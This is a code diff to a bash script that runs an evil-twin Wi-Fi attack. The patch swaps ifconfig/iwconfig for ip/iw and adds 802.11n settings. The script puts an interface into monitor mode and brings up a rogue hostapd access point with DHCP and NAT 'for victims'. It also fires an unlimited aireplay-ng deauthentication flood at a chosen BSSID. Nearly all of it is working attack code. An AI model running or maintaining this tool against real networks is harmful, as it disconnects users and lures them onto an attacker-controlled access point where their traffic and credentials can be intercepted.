@@ -39,6 +39,7 @@ DNS=8.8.8.8
 # Fake AP network variables.
 AP_SUBNET=192.168.3.0
 AP_MASK=255.255.255.0
+AP_PREFIX=24
 AP_BROADCAST=192.168.3.255
 AP_ROUTER=192.168.3.1
 AP_RANGE_START=192.168.3.20
@@ -598,7 +599,9 @@ select_interface() {
         done
 
         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Enabling monitor mode on ${BOLD_PURPLE}${wlan}${WHITE}."
-        ifconfig ${wlan} down && iwconfig ${wlan} mode monitor && ifconfig ${wlan} up > /dev/null 2> /dev/null &
+        ip link set dev "${wlan}" down 2>/dev/null
+        iw dev "${wlan}" set type monitor 2>/dev/null
+        ip link set dev "${wlan}" up 2>/dev/null
         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Mode Monitor ${BOLD_GREEN}is enabled${WHITE}."
 
     elif [ -n "${interfaces_monitor_mode}" ]; then
@@ -927,10 +930,10 @@ cleanup() {
     iptables -D FORWARD -i "${lan}" -o "${ap_iface}" -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
     iptables -t nat -D POSTROUTING -o "${lan}" -j MASQUERADE 2>/dev/null || true
     if [ -n "${AP_IFACE:-}" ]; then
-        ifconfig "${AP_IFACE}" down 2>/dev/null || true
+        ip link set dev "${AP_IFACE}" down 2>/dev/null || true
         ip addr flush dev "${AP_IFACE}" 2>/dev/null || true
-        iwconfig "${AP_IFACE}" mode managed 2>/dev/null || true
-        ip link set "${AP_IFACE}" up 2>/dev/null || true
+        iw dev "${AP_IFACE}" set type managed 2>/dev/null || true
+        ip link set dev "${AP_IFACE}" up 2>/dev/null || true
         nmcli device set "${AP_IFACE}" managed yes 2>/dev/null || true
     fi
     rm -f "${DHCPD_CONF}" "${DHCPD_LEASES}" 2>/dev/null || true
@@ -1017,9 +1020,9 @@ main() {
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting fake access point (hostapd)...${WHITE}"
 
                     nmcli device set "${wlan}" managed no 2>/dev/null || true
-                    ifconfig "${wlan}" down
-                    iwconfig "${wlan}" mode managed
-                    ifconfig "${wlan}" up
+                    ip link set dev "${wlan}" down
+                    iw dev "${wlan}" set type managed
+                    ip link set dev "${wlan}" up
 
                     cat > "${TMP_DIR}/hostapd.conf" << HCONF
 interface=${wlan}
@@ -1029,6 +1032,8 @@ hw_mode=g
 channel=${selected_channel}
 auth_algs=1
 ignore_broadcast_ssid=0
+ieee80211n=1
+wmm_enabled=1
 HCONF
 
                     run_background "hostapd ${TMP_DIR}/hostapd.conf" "hostapd"
@@ -1060,7 +1065,9 @@ HCONF
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Configuring network for victims...${WHITE}"
                     create_dhcpd_config_file
 
-                    ifconfig "${wlan}" ${AP_ROUTER} netmask ${AP_MASK} up
+                    ip addr flush dev "${wlan}"
+                    ip addr add "${AP_ROUTER}/${AP_PREFIX}" dev "${wlan}"
+                    ip link set dev "${wlan}" up
 
                     iptables -P FORWARD ACCEPT
                     echo "1" > /proc/sys/net/ipv4/ip_forward
@@ -1109,7 +1116,7 @@ HCONF
                                         iw dev "${wlan}" interface add "${MON_IFACE}" type monitor
                                         ip link set "${MON_IFACE}" up
                                     fi
-                                    iwconfig "${MON_IFACE}" channel ${selected_channel} 2>/dev/null
+                                    iw dev "${MON_IFACE}" set channel ${selected_channel} 2>/dev/null || iwconfig "${MON_IFACE}" channel ${selected_channel} 2>/dev/null
                                     run_background "aireplay-ng -0 0 -a ${selected_bssid} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
                                     deauth_running=true
                                 else
